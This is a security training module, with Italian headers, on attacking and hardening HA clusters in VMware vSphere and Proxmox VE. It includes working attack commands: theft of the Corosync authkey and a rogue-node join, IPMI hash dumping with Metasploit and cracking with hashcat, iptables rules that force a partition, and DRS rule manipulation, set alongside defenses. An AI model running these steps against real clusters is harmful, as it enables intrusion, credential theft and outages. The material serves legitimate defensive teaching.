# High Availability and Clustering Security — VMware vSphere HA/DRS and Proxmox VE HA

> **Modulo del corso:** Migrazione VMware → Proxmox VE
> **Posizione nel percorso:** Fase 9 — Sicurezza avanzata · Modulo 37 (nuovo)
> **Prerequisiti:** moduli 01-02 (fondamenti VMware e Proxmox), modulo 10 (cluster HA post-migrazione), modulo 12 (sicurezza e compliance), modulo 20 (hypervisor security hardening), familiarita con protocolli cluster (Corosync, CMAN, Totem), networking L2-L4, IPMI/BMC, PKI/TLS, SIEM integration.
> **Obiettivi di apprendimento.** Al termine del modulo lo studente sara in grado di:
> 1. analizzare e mettere in sicurezza le comunicazioni cluster (Corosync per Proxmox, VSAN/vCLS per VMware);
> 2. identificare e mitigare attacchi a quorum, split-brain, e fencing;
> 3. eseguire hardening completo dei meccanismi HA su entrambe le piattaforme;
> 4. progettare fencing sicuro con isolamento di rete e rotazione credenziali;
> 5. rilevare failover non autorizzati, manipolazione di priorita e quorum injection;
> 6. mettere in sicurezza load balancer, VIP e protocolli VRRP;
> 7. proteggere replica e disaster recovery da intercettazione e manipolazione;
> 8. implementare monitoring e SIEM correlation per eventi HA;
> 9. condurre penetration testing mirato a infrastrutture HA in ambiente lab autorizzato;
> 10. eseguire lab exercises per validare configurazioni di sicurezza cluster.
> **Tempo stimato:** lettura 150-200 min · implementazione hardening 3-5 settimane · assessment ciclico trimestrale
> **Livello:** expert (Dreyfus 5); offensive security awareness required
> **Ultimo aggiornamento:** 2026-05-07
> **Versioni di riferimento:** VMware vSphere 7.0 U3 / 8.0 U3; Proxmox VE 8.x (Corosync 3.x, kronosnet); CIS Benchmark ESXi 7.0/8.0; DISA STIG vSphere 7/8.

---

## Mappa concettuale

```
+====================================================================+
|     HIGH AVAILABILITY SECURITY: attack surface & defense            |
+====================================================================+
|                                                                    |
|   LAYER 1: CLUSTER COMMUNICATION                                   |
|     Corosync/kronosnet encryption, vSAN KMIP, vCLS isolation       |
|                                                                    |
|   LAYER 2: QUORUM & SPLIT-BRAIN                                    |
|     Vote injection, partition manipulation, QDevice security       |
|                                                                    |
|   LAYER 3: FENCING / STONITH                                       |
|     IPMI/iLO/DRAC credential theft, false fence triggers           |
|                                                                    |
|   LAYER 4: FAILOVER MECHANISMS                                     |
|     False failover DoS, priority abuse, affinity bypass            |
|                                                                    |
|   LAYER 5: LOAD BALANCERS & VIPs                                   |
|     ARP poisoning, VRRP auth weakness, BGP hijacking               |
|                                                                    |
|   LAYER 6: DISASTER RECOVERY                                       |
|     Replication encryption, RPO manipulation, backup integrity     |
|                                                                    |
|   LAYER 7: MONITORING & AUDIT                                      |
|     SIEM correlation, unauthorized failover detection               |
|                                                                    |
+====================================================================+
```

---

## 1. Cluster Communication Security

### 1.1 Corosync Encryption and Authentication (Proxmox VE)

Proxmox VE relies on Corosync 3.x with the kronosnet (knet) transport layer for all intra-cluster communication. Every cluster membership change, resource lock, and HA decision flows through this channel. Compromise of cluster communication is equivalent to full cluster compromise.

#### Corosync Crypto Architecture

Corosync 3.x with knet supports two cryptographic modes:

| Parameter | Description | Recommended Value |
|-----------|-------------|-------------------|
| `crypto_cipher` | Symmetric cipher for payload encryption | `aes256` |
| `crypto_hash` | HMAC algorithm for authentication | `sha256` or `sha384` |
| `secauth` | Enable security authentication | `on` |
| `transport` | Transport layer | `knet` (mandatory for crypto in Corosync 3.x) |

**Key material:** Corosync uses a shared authkey file (`/etc/corosync/authkey`) generated during cluster creation. This 128-byte random key seeds both encryption and HMAC computation. The keyfile is distributed to all nodes during `pvecm add`.

#### Corosync Configuration — Secure Defaults

```ini
# /etc/corosync/corosync.conf — crypto section
totem {
    version: 2
    cluster_name: production-cluster
    transport: knet
    crypto_cipher: aes256
    crypto_hash: sha256
    secauth: on
    
    interface {
        linknumber: 0
        knet_transport: udp
    }
    interface {
        linknumber: 1
        knet_transport: udp
    }
}

logging {
    to_syslog: yes
    to_logfile: yes
    logfile: /var/log/corosync/corosync.log
    debug: off
    timestamp: on
}
```

#### Attack: Corosync Authkey Theft

**Scenario:** An attacker gains read access to `/etc/corosync/authkey` on any cluster node (via LFI vulnerability in a web application, compromised backup, or lateral movement from a guest VM).

**Impact:** With the authkey, the attacker can:
1. Inject crafted Corosync messages into the cluster ring
2. Add rogue nodes to the cluster
3. Manipulate quorum votes
4. Trigger split-brain conditions
5. Force resource migrations to attacker-controlled nodes

**Proof of Concept (Authorized Lab Only):**

```bash
# On attacker machine — after obtaining authkey
# Craft a Corosync membership join packet
# Using corosync-cfgtool equivalent with stolen key material

# Step 1: Copy stolen authkey
scp compromised-node:/etc/corosync/authkey /tmp/stolen-authkey

# Step 2: Configure rogue node with same cluster config
cp /tmp/stolen-authkey /etc/corosync/authkey
# Modify corosync.conf to match cluster parameters (cluster_name, ring addresses)

# Step 3: Start corosync — rogue node joins cluster
systemctl start corosync

# Step 4: The rogue node now participates in quorum
corosync-quorumtool -s
# Shows our node as a voting member
```

**Defensive Measures:**

```bash
# 1. Restrict authkey permissions (should be 0400 root:root)
chmod 0400 /etc/corosync/authkey
chown root:root /etc/corosync/authkey

# 2. File integrity monitoring on authkey
# AIDE configuration
echo '/etc/corosync/authkey p+i+u+g+sha256' >> /etc/aide/aide.conf
aide --update

# 3. Prevent authkey from appearing in backups
# Exclude from backup tools (add to exclusion list)
echo '/etc/corosync/authkey' >> /etc/proxmox-backup/exclusions.list

# 4. Monitor for unexpected corosync membership changes
# journalctl filter for membership events
journalctl -u corosync -f | grep -E "(new|left|joined|membership)"

# 5. Network-level: restrict Corosync ports to cluster-only VLAN
iptables -A INPUT -p udp --dport 5405:5412 -s 10.10.100.0/24 -j ACCEPT
iptables -A INPUT -p udp --dport 5405:5412 -j DROP
```

### 1.2 VSAN and vCLS Communication Security (VMware)

VMware vSAN uses KMIP-integrated encryption for data-at-rest and TLS for inter-host traffic. The vSphere Cluster Services (vCLS) VMs maintain cluster health but introduce additional attack surface.

#### vSAN Encryption Architecture

| Component | Protocol | Port | Security Control |
|-----------|----------|------|------------------|
| vSAN data traffic | Custom (L2/L3) | 2233 | Data-in-transit encryption (AES-256-XTS) |
| vSAN witness | HTTPS | 443 | Certificate-based auth |
| KMIP (KMS) | TLS 1.2+ | 5696 | Mutual TLS with client certs |
| vCLS agent | HTTPS | 443 | vCenter-signed certs |
| ESXi-to-ESXi vSAN | TCP | 2233 | Per-host KEK + DEK hierarchy |

#### Attack: vSAN Witness Node Impersonation

**Scenario:** In a 2-node vSAN stretched cluster, the witness appliance provides the deciding quorum vote. An attacker who can impersonate the witness gains quorum control.

**Attack Steps:**
1. Identify witness appliance IP and certificate fingerprint from vCenter
2. Perform DNS poisoning or ARP spoofing to redirect witness traffic
3. Deploy rogue witness with self-signed certificate (requires disabling cert verification or exploiting certificate trust)
4. Gain quorum majority, triggering partition of the legitimate site

**Defensive Measures:**

```powershell
# PowerCLI — Verify vSAN witness certificate pinning
Get-VsanWitnessHost | ForEach-Object {
    $witness = $_
    $cert = Get-VsanWitnessHostCertificate -WitnessHost $witness
    Write-Host "Witness: $($witness.Name) - Thumbprint: $($cert.Thumbprint)"
    # Compare against known-good fingerprint
}

# Enable vSAN data-in-transit encryption
$cluster = Get-Cluster "Production"
Set-VsanClusterConfiguration -Cluster $cluster `
    -DataInTransitEncryptionEnabled $true `
    -DataInTransitRekeyInterval 1440  # Rekey every 24 hours
```

### 1.3 Cluster Network Isolation Requirements

**Dedicated cluster networks are not optional — they are a fundamental security requirement.** Mixing cluster traffic with VM guest traffic or management traffic violates the principle of least privilege at the network layer.

#### Network Architecture — Secure Cluster Design

```
+------------------+     +------------------+     +------------------+
|    Node 1        |     |    Node 2        |     |    Node 3        |
+------------------+     +------------------+     +------------------+
| eth0: mgmt       |     | eth0: mgmt       |     | eth0: mgmt       |
| 10.0.1.11/24     |     | 10.0.1.12/24     |     | 10.0.1.13/24     |
|                  |     |                  |     |                  |
| eth1: cluster    |     | eth1: cluster    |     | eth1: cluster    |
| 10.10.100.11/24  |     | 10.10.100.12/24  |     | 10.10.100.13/24  |
| (VLAN 100, no GW)|     | (VLAN 100, no GW)|     | (VLAN 100, no GW)|
|                  |     |                  |     |                  |
| eth2: storage    |     | eth2: storage    |     | eth2: storage    |
| 10.20.200.11/24  |     | 10.20.200.12/24  |     | 10.20.200.13/24  |
| (VLAN 200, no GW)|     | (VLAN 200, no GW)|     | (VLAN 200, no GW)|
|                  |     |                  |     |                  |
| eth3: fencing    |     | eth3: fencing    |     | eth3: fencing    |
| 172.16.50.11/24  |     | 172.16.50.12/24  |     | 172.16.50.13/24  |
| (VLAN 50, no GW) |     | (VLAN 50, no GW) |     | (VLAN 50, no GW) |
+------------------+     +------------------+     +------------------+
```

**Critical design rules:**

1. **No default gateway on cluster/storage/fencing networks** — prevents routing to external networks
2. **No DHCP on cluster VLANs** — static addressing only, eliminates DHCP poisoning
3. **Port security on switch** — MAC address locking per port, prevents rogue nodes
4. **Private VLANs** — isolate cluster traffic even from same-VLAN sniffing
5. **Disable STP on cluster ports** — prevents topology manipulation (or use BPDU guard)
6. **Jumbo frames** for cluster/storage (MTU 9000) — different from standard 1500, acts as implicit segmentation

```bash
# Proxmox: Configure dedicated cluster network
# /etc/network/interfaces
auto ens1
iface ens1 inet static
    address 10.10.100.11/24
    mtu 9000
    # NO gateway — intentionally isolated
    # NO dns-nameservers

# Bind Corosync to cluster-only interface
pvecm updatecerts
# Verify in /etc/corosync/corosync.conf:
# interface { linknumber: 0 } uses 10.10.100.x range only
```

### 1.4 Wireshark Analysis of Cluster Protocols

Understanding cluster protocol traffic at the packet level is essential for both defensive monitoring and attack detection.

#### Corosync/Totem Protocol Analysis

```
# Capture Corosync traffic (requires access to cluster VLAN)
tcpdump -i ens1 -w /tmp/corosync_capture.pcap port 5405

# Wireshark display filters for Corosync analysis:
# All Corosync: udp.port == 5405
# Membership changes: corosync.type == 0x05
# Token passes: corosync.type == 0x01
# Configuration changes: corosync.type == 0x0A
```

**What encrypted Corosync traffic looks like:**

When crypto is properly configured, Wireshark will show UDP packets on port 5405 with an opaque payload — no readable Totem headers. If you can see `TOTEM` magic bytes or plaintext node IDs in the capture, **encryption is not functioning**.

**Detection of unencrypted cluster traffic (CRITICAL finding):**

```python
#!/usr/bin/env python3
"""Detect unencrypted Corosync traffic — SECURITY AUDIT TOOL
Run on a span/mirror port of the cluster VLAN."""

from scapy.all import sniff, UDP, Raw
import sys

COROSYNC_PORT = 5405
TOTEM_MAGIC = b'\xff\xff\x00\x00'  # Totem Single Ring magic

def check_packet(pkt):
    if pkt.haslayer(UDP) and pkt[UDP].dport == COROSYNC_PORT:
        if pkt.haslayer(Raw):
            payload = pkt[Raw].load
            if TOTEM_MAGIC in payload[:8]:
                print(f"[CRITICAL] UNENCRYPTED Corosync traffic detected!")
                print(f"  Source: {pkt.src} -> {pkt.dst}")
                print(f"  Payload preview: {payload[:32].hex()}")
                return True
    return False

print("[*] Monitoring for unencrypted Corosync traffic...")
print("[*] If crypto is working, you should see NO alerts.")
sniff(filter=f"udp port {COROSYNC_PORT}", prn=check_packet, store=0)
```

#### VMware FDM Protocol Analysis

VMware Fault Domain Manager (FDM) uses port 8182 for HA agent-to-agent communication:

```
# Capture VMware HA traffic
tcpdump -i vmk1 -w /tmp/fdm_capture.pcap port 8182

# Wireshark filter: tcp.port == 8182
# FDM uses SSL/TLS — look for certificate exchange anomalies
# Alert on: certificate changes, unknown CAs, self-signed certs
```

---

## 2. Fencing and STONITH Security

### 2.1 Fencing Device Authentication

Fencing (Shoot The Other Node In The Head — STONITH) is the critical mechanism that prevents split-brain data corruption. The irony: the very mechanism designed to protect cluster integrity is itself a high-value attack target.

#### IPMI/BMC Credential Landscape

| BMC Type | Default Port | Protocol | Auth Mechanism |
|----------|-------------|----------|----------------|
| IPMI 2.0 | 623/UDP | RMCP+ | Username/password + RAKP (vulnerable to offline brute-force) |
| HP iLO 5/6 | 443/TCP | HTTPS/REST | Certificate or password auth |
| Dell iDRAC 9 | 443/TCP | HTTPS/Redfish | Certificate or password auth |
| Lenovo XCC | 443/TCP | HTTPS/Redfish | Certificate or password auth |
| Supermicro BMC | 443/TCP, 623/UDP | HTTPS + IPMI | Password auth (often weak defaults) |

#### Attack: IPMI Authentication Bypass and Credential Extraction

**Scenario:** IPMI 2.0 RAKP protocol is fundamentally flawed — during the authentication handshake, the BMC sends a salted hash of the user password to the client before authentication is complete. This enables offline brute-force attacks.

**CVE-2013-4786 — IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval:**

```bash
# Using ipmitool to trigger RAKP handshake (no auth required)
# The BMC responds with HMAC-SHA1 of the password
ipmitool -I lanplus -H 172.16.50.11 -U admin -P wrong_password chassis status
# Even with wrong password, the RAKP exchange occurs
# Captured hash can be cracked offline

# Metasploit module for IPMI hash dumping
msfconsole -q -x "
use auxiliary/scanner/ipmi/ipmi_dumphashes;
set RHOSTS 172.16.50.0/24;
set OUTPUT_HASHCAT_FILE /tmp/ipmi_hashes.txt;
run;
exit"

# Hashcat crack (IPMI2 RAKP HMAC-SHA1 = mode 7300)
hashcat -m 7300 /tmp/ipmi_hashes.txt wordlist.txt -r rules/best64.rule
```

**Impact on fencing:** If the attacker cracks IPMI credentials used for fencing, they can:
1. Power off arbitrary nodes, causing uncontrolled failovers
2. Power on compromised nodes to rejoin the cluster
3. Disable fencing by changing BMC network configuration
4. Flash malicious BMC firmware for persistent access

#### Defensive Measures for Fencing Credentials

```bash
# 1. Dedicated fencing VLAN with ACLs (no routing to/from other VLANs)
# Switch configuration example (Cisco IOS-like):
# interface vlan 50
#   ip address 172.16.50.1 255.255.255.0
#   no ip route-cache
#   ip access-group FENCING_ACL in

# 2. Create dedicated fencing-only user on IPMI with minimal privileges
ipmitool -I lanplus -H 172.16.50.11 -U admin -P "$ADMIN_PASS" \
    user set name 3 fence_user
ipmitool -I lanplus -H 172.16.50.11 -U admin -P "$ADMIN_PASS" \
    user set password 3 "$(openssl rand -base64 32)"
# Set privilege level to OPERATOR (level 3) — enough for power control
ipmitool -I lanplus -H 172.16.50.11 -U admin -P "$ADMIN_PASS" \
    user priv 3 3 1

# 3. Disable IPMI over LAN cipher suite 0 (no auth)
ipmitool -I lanplus -H 172.16.50.11 -U admin -P "$ADMIN_PASS" \
    raw 0x0c 0x01 0x01 0x08 0x04 0x00 0x00 0x00

# 4. Use Redfish API with TLS client certificates instead of IPMI where possible
# iDRAC certificate-based auth:
curl -k --cert /etc/pve/priv/fence-client.pem \
    --key /etc/pve/priv/fence-client-key.pem \
    https://172.16.50.11/redfish/v1/Systems/System.Embedded.1/Actions/ComputerSystem.Reset \
    -d '{"ResetType": "ForceOff"}'

# 5. Credential rotation script (run quarterly via cron)
#!/bin/bash
NEW_PASS=$(openssl rand -base64 32)
for NODE_BMC in 172.16.50.{11,12,13}; do
    ipmitool -I lanplus -H "$NODE_BMC" -U admin -P "$OLD_PASS" \
        user set password 3 "$NEW_PASS"
done
# Update fencing config with new credential
pvesh set /cluster/ha/resources --fence_pass "$NEW_PASS"
```

### 2.2 Fencing as Attack Vector — Forcing False Failovers

**Attack Scenario: Weaponized Fencing for Denial of Service**

An attacker with access to the fencing network or stolen IPMI credentials can systematically power off cluster nodes, triggering cascading failovers that exhaust cluster resources.

```
Attack Timeline:
T+0:    Attacker issues IPMI power-off to Node 1
T+5s:   Corosync detects Node 1 loss, quorum recalculated
T+10s:  HA manager starts migrating Node 1 workloads to Node 2 and Node 3
T+30s:  During heavy migration load, attacker powers off Node 2
T+35s:  Only Node 3 remains — may lose quorum (2/3 nodes gone)
T+40s:  Complete cluster failure — ALL workloads down
```

**Detection:**

```bash
# Monitor for rapid succession of fencing events
# /var/log/pve/ha-manager/current
grep -E "fencing node|node.*dead|quorum lost" /var/log/pve/ha-manager/current

# Systemd journal for IPMI activity:
journalctl -u fence_ipmilan --since "5 minutes ago" | grep -c "success"
# Alert if > 1 fence event in 5 minutes (abnormal in healthy clusters)
```

### 2.3 Proxmox HA Fencing vs VMware HA Isolation Response

| Aspect | Proxmox VE HA | VMware vSphere HA |
|--------|---------------|-------------------|
| Fencing mechanism | STONITH via IPMI/watchdog | Isolation response (power off/leave powered on/shutdown) |
| Trigger | Node unreachable by Corosync | Missing heartbeats + datastore heartbeat failure |
| Authentication | IPMI credentials in `/etc/pve` | ESXi host certificates + vCenter trust |
| Attack surface | IPMI network, credential files | Heartbeat network, datastore access |
| Bypass risk | Disable watchdog, block IPMI | Respond to isolation ping, fake heartbeat |
| Default safe behavior | Node self-fences via watchdog | VM powered off (default) or left running |

**VMware Isolation Response Attack:**

```
# If attacker can respond to HA isolation address pings on behalf of
# an isolated host, the host believes it is NOT isolated and VMs
# keep running on both sides = split-brain with data corruption

# Attack: ARP poison the isolation address (default gateway or custom IP)
# so isolated host receives ping replies from attacker
# Result: Host thinks it's connected, doesn't trigger isolation response
```

---

## 3. Quorum Attacks

### 3.1 Quorum Device Manipulation

Quorum — the minimum number of votes required for the cluster to operate — is the mathematical foundation of split-brain prevention. Attacking quorum is attacking the cluster's decision-making capability.

#### Proxmox Quorum Mechanics

```
Cluster with N nodes:
- Each node has 1 vote by default
- Quorum = floor(N/2) + 1
- 3 nodes: quorum = 2 (can lose 1)
- 5 nodes: quorum = 3 (can lose 2)
- 2 nodes: quorum = 2 (can lose 0 — problematic!)
```

#### Attack: Vote Injection via Rogue Node

**Prerequisite:** Attacker possesses the Corosync authkey (stolen from backup, exploited node, etc.)

**Scenario:** Attacker adds a rogue node to shift quorum calculations, then partitions the network to make their partition the majority.

```bash
# Attacker joins rogue node to cluster (requires authkey)
# This increases total votes, changing quorum requirements

# Before attack: 3 nodes, quorum = 2
# After rogue node joins: 4 nodes, quorum = 3
# Attacker partitions network: legitimate nodes on one side (2 votes)
# Rogue + one legitimate node on other side (2 votes)
# NEITHER side has quorum — complete cluster freeze

# Or: Attacker joins 2 rogue nodes
# 5 total nodes, quorum = 3
# Attacker controls 2 rogue + partitions 1 legitimate to their side
# Attacker partition has 3 votes = quorum
# Legitimate partition has 2 votes = no quorum = services stop
```

**Detection and Prevention:**

```bash
# 1. Monitor expected_votes vs actual membership
corosync-quorumtool -s
# Alert if: Total votes != expected count

# 2. Lock cluster membership (Proxmox)
# After initial setup, require manual approval for new nodes
# Monitor /var/log/corosync/corosync.log for membership changes:
grep "members joined" /var/log/corosync/corosync.log

# 3. Implement node identity verification
# Each node's SSL certificate in /etc/pve/nodes/<name>/pve-ssl.pem
# is signed by the cluster CA (/etc/pve/pve-root-ca.pem)
# Verify cluster CA hasn't been replaced:
openssl x509 -in /etc/pve/pve-root-ca.pem -fingerprint -noout
# Compare against documented/expected fingerprint

# 4. Automated alerting on membership changes
cat << 'EOF' > /usr/local/bin/quorum-monitor.sh
#!/bin/bash
EXPECTED_NODES=3
CURRENT=$(corosync-quorumtool -s | grep "Total votes" | awk '{print $3}')
if [ "$CURRENT" != "$EXPECTED_NODES" ]; then
    logger -p auth.crit "SECURITY: Quorum vote count changed! Expected=$EXPECTED_NODES Actual=$CURRENT"
    # Send alert via monitoring system
    curl -s -X POST "$ALERTMANAGER_URL/api/v1/alerts" \
        -H "Content-Type: application/json" \
        -d "[{\"labels\":{\"alertname\":\"QuorumVoteCountChanged\",\"severity\":\"critical\"}}]"
fi
EOF
chmod +x /usr/local/bin/quorum-monitor.sh
# Run every 30 seconds via systemd timer
```

### 3.2 Network Partition Exploitation

**Attack: Controlled Network Partition for Split-Brain**

The most elegant quorum attack does not require cluster credentials — only network access. By selectively blocking cluster communication between specific nodes, an attacker can force a split-brain condition.

```
Normal topology:
    Node1 ←→ Node2 ←→ Node3
    Node1 ←→ Node3
    (Full mesh, all nodes see each other)

Attack: Block traffic between Node1 and {Node2, Node3}
    Node1 [ISOLATED]     Node2 ←→ Node3
    
    Result:
    - Node2+Node3 have quorum (2/3 votes), continue operating
    - Node1 has 1 vote, loses quorum
    - If Node1 doesn't self-fence: potential split-brain
    - If fencing fails: data corruption risk
```

**Network-level attack implementation:**

```bash
# On a compromised switch or via ARP spoofing:
# Block Corosync (UDP 5405-5412) between Node1 and other nodes

# Using iptables on a compromised router between nodes:
iptables -A FORWARD -s 10.10.100.11 -d 10.10.100.12 -p udp --dport 5405 -j DROP
iptables -A FORWARD -s 10.10.100.11 -d 10.10.100.13 -p udp --dport 5405 -j DROP
iptables -A FORWARD -s 10.10.100.12 -d 10.10.100.11 -p udp --dport 5405 -j DROP
iptables -A FORWARD -s 10.10.100.13 -d 10.10.100.11 -p udp --dport 5405 -j DROP

# Result: Node1 is partitioned from the cluster
# If fencing network is also partitioned: split-brain
```

**Defensive measures — multi-path cluster communication:**

```ini
# Corosync with redundant links (Proxmox supports up to 8 links)
# /etc/corosync/corosync.conf
totem {
    transport: knet
    
    interface {
        linknumber: 0
        # Primary cluster link — VLAN 100
    }
    interface {
        linknumber: 1
        # Secondary cluster link — VLAN 101, different switch/path
    }
}

# With 2 links, attacker must compromise BOTH network paths simultaneously
# Use physically separate switches or different ISP paths for max resilience
```

### 3.3 External Quorum Devices (QDevice/QNetd) Security

For 2-node clusters (common in branch offices), a third-party QDevice provides the tie-breaking vote. This device becomes a critical security target.

#### QDevice Architecture

```
+--------+                    +--------+
| Node 1 |---cluster link---| Node 2 |
+--------+                    +--------+
     \                           /
      \--- QDevice network ---/
              |
         +---------+
         | QNetd   |  (provides tie-breaking vote)
         | Server  |
         +---------+
```

#### Attack: QNetd Compromise

**Scenario:** The QNetd server typically runs on a lightweight Linux host. If compromised, the attacker controls quorum in all 2-node clusters it serves.

```bash
# QNetd stores client certificates in /etc/corosync/qnetd/nssdb/
# If attacker gains root on QNetd host:

# 1. They can issue votes arbitrarily
# 2. They can refuse to vote, causing quorum loss
# 3. They can selectively vote for one side in a partition

# Attack: Force quorum loss by stopping QNetd during a real partition
systemctl stop corosync-qnetd
# Both nodes now have 1 vote each + no QDevice vote
# Neither has quorum — complete cluster freeze
```

**Hardening QNetd:**

```bash
# 1. Dedicated hardened host (minimal OS, no other services)
# 2. TLS mutual authentication (default in Corosync QDevice)
# 3. Restrict network access
iptables -A INPUT -p tcp --dport 5403 -s 10.10.100.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 5403 -j DROP

# 4. Certificate pinning — monitor for unexpected cert changes
ls -la /etc/corosync/qnetd/nssdb/
# Integrity monitoring on NSS database

# 5. High availability for QNetd itself (run multiple, use different sites)
# 6. Monitor QNetd connectivity from both nodes
corosync-qdevice-tool -s
# Alert if qdevice connection drops
```

### 3.4 Witness Node Attacks in Stretched Clusters

VMware stretched clusters use witness nodes (typically a witness appliance) at a third site. These witnesses hold metadata components and provide quorum votes.

**Attack vectors against witness nodes:**

1. **DNS manipulation:** If witness resolution depends on DNS, poisoning DNS can redirect traffic to attacker-controlled witness
2. **Certificate swap:** Replace witness certificate to impersonate it
3. **Network DoS:** DDoS the witness during a real site failure = no quorum resolution
4. **Witness VM compromise:** If running as a VM, standard VM exploitation applies

```powershell
# VMware — Verify witness health and certificate integrity
$witness = Get-VsanWitnessHost
$witness | ForEach-Object {
    $health = Test-VsanWitnessHostConnection -WitnessHost $_
    $cert = Get-VsanWitnessHostCertificate -WitnessHost $_
    Write-Host "Witness: $($_.Name) | Connected: $($health.Connected) | CertExpiry: $($cert.NotAfter)"
    # Compare thumbprint to documented value
    if ($cert.Thumbprint -ne $EXPECTED_THUMBPRINT) {
        Write-Warning "CERTIFICATE MISMATCH - possible impersonation!"
    }
}
```

---

## 4. Failover Exploitation

### 4.1 Triggering False Failovers for Denial of Service

Failover is a double-edged sword: it protects against genuine failures but can be weaponized. Every failover involves service disruption (even if brief), resource rebalancing, and potential data inconsistency during transition.

#### Attack: Resource Exhaustion via Repeated Failovers

```
Attack pattern:
1. Identify workload with aggressive HA restart policy
2. Repeatedly crash the workload (e.g., via guest-level exploit)
3. HA restarts it each time, consuming cluster resources
4. If max_restarts threshold is high: DoS via resource exhaustion
5. If on different nodes each time: cascading performance degradation

# VMware: DRS will live-migrate VMs to rebalance
# Each migration consumes: network bandwidth, CPU, memory overhead
# 100+ simultaneous migrations = cluster performance collapse
```

**Proxmox HA restart policy exploitation:**

```bash
# Default HA behavior: restart failed services up to max_restart + max_relocate times
# within the defined timeframe

# If an attacker can repeatedly crash a VM (e.g., via guest kernel exploit):
# The HA manager will keep restarting/relocating it

# Check HA resource configuration:
pvesh get /cluster/ha/resources
# Look for: max_restart, max_relocate values

# Attack amplification: crash multiple HA-managed VMs simultaneously
# Each generates migration traffic + restart overhead
# On resource-constrained cluster: triggers memory/CPU overcommit
```

**Defensive measures:**

```bash
# 1. Set conservative restart limits
pvesh set /cluster/ha/resources/vm:100 \
    --max_restart 2 \
    --max_relocate 1

# 2. Implement restart delay/backoff
# Custom watchdog in VM that detects restart loops:
cat << 'EOF' > /usr/local/bin/restart-loop-detector.sh
#!/bin/bash
BOOT_COUNT_FILE="/var/run/boot_count"
THRESHOLD=3
WINDOW=300  # 5 minutes

# Increment boot counter
COUNT=$(cat "$BOOT_COUNT_FILE" 2>/dev/null || echo 0)
COUNT=$((COUNT + 1))
echo "$COUNT" > "$BOOT_COUNT_FILE"

if [ "$COUNT" -ge "$THRESHOLD" ]; then
    logger -p auth.crit "ALERT: Restart loop detected ($COUNT restarts in window)"
    # Notify monitoring, potentially request HA disable for this VM
fi

# Reset counter after window
sleep "$WINDOW" && echo "0" > "$BOOT_COUNT_FILE" &
EOF

# 3. Monitor for abnormal migration frequency
# Alert if > N migrations/hour in SIEM
```

### 4.2 Workload Redistribution Manipulation

**Attack: Force workloads to specific nodes for exploitation**

If an attacker can manipulate HA/DRS decisions, they can concentrate workloads on a single node (overload DoS) or move a target VM to a compromised node (data theft).

```powershell
# VMware DRS rule manipulation (requires vCenter admin access):
# Create affinity rule to pin target VM to compromised host

$vm = Get-VM "sensitive-database"
$host = Get-VMHost "compromised-esxi-host"
$cluster = Get-Cluster "Production"

# Create mandatory affinity rule
New-DrsVMHostRule -Name "pin-sensitive-db" `
    -Cluster $cluster `
    -VMGroup (New-DrsVMGroup -Name "target-vms" -VM $vm -Cluster $cluster) `
    -VMHostGroup (New-DrsVMHostGroup -Name "target-hosts" -VMHost $host -Cluster $cluster) `
    -Type MustRunOn

# Now the VM is pinned to the compromised host
# Attacker can perform memory dumps, storage sniffing, etc.
```

### 4.3 Priority and Affinity Rule Abuse

**Proxmox HA Group Manipulation:**

```bash
# HA groups control which nodes can run specific VMs
# and their priority order

# View current HA groups
pvesh get /cluster/ha/groups

# Attack: If attacker gains API access, modify group to force
# VM onto specific node
pvesh set /cluster/ha/groups/production \
    --nodes "compromised-node:1,legitimate-node1:2,legitimate-node2:2"
# Priority 1 = preferred node = compromised-node
# HA manager will migrate VMs to compromised-node

# Detection: Monitor /etc/pve/ha/groups.cfg for unauthorized changes
inotifywait -m /etc/pve/ha/ -e modify -e create -e delete |
while read path action file; do
    logger -p auth.warning "HA config changed: $action $path$file"
done
```

### 4.4 Anti-Affinity Bypass for Co-location Attacks

Anti-affinity rules ensure certain VMs never run on the same host (e.g., redundant database replicas, competing workloads). Bypassing these rules enables single-point-of-failure attacks.

```powershell
# VMware: DRS anti-affinity rule bypass
# Scenario: DB primary and replica have anti-affinity rule
# Attack: Put both on same host, then crash that host = total DB loss

# Method 1: Delete the anti-affinity rule
$rule = Get-DrsRule -Cluster $cluster -Name "db-anti-affinity"
Remove-DrsRule -Rule $rule -Confirm:$false

# Method 2: Change from "must" to "should" (allows DRS override)
Set-DrsRule -Rule $rule -Type ShouldRunSeparate

# Method 3: Disable DRS temporarily, manually vMotion both VMs to same host
Set-Cluster -Cluster $cluster -DRSEnabled:$false
Move-VM -VM $dbPrimary -Destination $targetHost
Move-VM -VM $dbReplica -Destination $targetHost
Set-Cluster -Cluster $cluster -DRSEnabled:$true

# Detection: Monitor DRS rule changes in vCenter event log
Get-VIEvent -MaxSamples 1000 | Where-Object {
    $_.FullFormattedMessage -match "DrsRule|affinity"
}
```

---

## 5. VMware HA/DRS Security

### 5.1 HA Agent Security and FDM Authentication

VMware HA uses the Fault Domain Manager (FDM) agent on each ESXi host. FDM agents communicate over port 8182/TCP using SSL. One host is elected as the primary FDM agent (master), coordinating all HA decisions.

#### FDM Trust Model

```
vCenter Server
    |
    | (deploys FDM agent, distributes certificates)
    |
    v
+---ESXi Host 1 (FDM Master)---+     +---ESXi Host 2 (FDM Slave)---+
| /opt/vmware/fdm/             |     | /opt/vmware/fdm/             |
| - fdm binary                 | SSL | - fdm binary                 |
| - host SSL certificate       |<--->| - host SSL certificate       |
| - vCenter CA trust           |     | - vCenter CA trust           |
+------------------------------+     +------------------------------+
```

**Attack: FDM Master Impersonation**

If an attacker can impersonate the FDM master, they control all HA decisions — which VMs restart, on which hosts, and when fencing occurs.

```bash
# FDM master election is based on:
# 1. Access to the most datastores
# 2. Host with the most VMs (tiebreaker)
# 3. Lexicographic host UUID (final tiebreaker)

# Attack vector: If attacker compromises one ESXi host,
# they can manipulate the FDM master election by:
# - Presenting more datastore mounts (fabricated)
# - Manipulating host UUID
# - Crashing current master to trigger re-election

# Detection: Monitor FDM master changes
# vCenter event: com.vmware.vc.ha.MasterChangedEvent
Get-VIEvent -MaxSamples 5000 | Where-Object {
    $_.GetType().Name -match "MasterChanged"
}
```

**Hardening FDM:**

```powershell
# 1. Restrict FDM port access via ESXi firewall
$esxcli = Get-EsxCli -VMHost $host -V2
$esxcli.network.firewall.ruleset.set.Invoke(@{
    enabled = $true
    rulesetid = "fdm"
})
# Customize allowed IP ranges for FDM traffic

# 2. Verify FDM agent integrity
$fdmHash = Get-VMHostAdvancedSetting -VMHost $host -Name "fdm.binary.hash"
# Compare against known-good hash from VMware

# 3. Monitor for FDM configuration tampering
